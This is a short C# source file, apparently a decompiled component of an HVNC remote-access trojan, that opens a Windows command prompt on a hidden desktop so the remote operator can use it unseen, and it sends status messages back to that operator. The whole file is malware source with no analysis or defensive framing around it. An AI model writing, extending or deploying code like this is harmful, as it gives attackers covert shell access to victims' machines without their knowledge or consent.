#define DEBUG
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using HVNC;

namespace S.OpenApp;

internal class CommandPrompt
{
	private static readonly string fileNameCmd = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\cmd.exe";

	public static void Open()
	{
		try
		{
			if (!File.Exists(fileNameCmd))
			{
				HVNC.Plugin.Helper.SendMSG("Cmd: Not Found!");
				return;
			}
			HideDesktop.CreateProcess(fileNameCmd, HVNC.Plugin.Helper.NameDesktop, bAppName: false);
			Debug.WriteLine("Running.////");
			HVNC.Plugin.Helper.SendMSG("Cmd: Running");
			Thread.Sleep(2000);
			HideDesktop.Load(HVNC.Plugin.Helper.HVNCDesktop);
			Debug.WriteLine("Refresh");
		}
		catch (Exception ex)
		{
			HVNC.Plugin.Helper.SendMSG("Cmd: " + ex.Message);
		}
	}
}
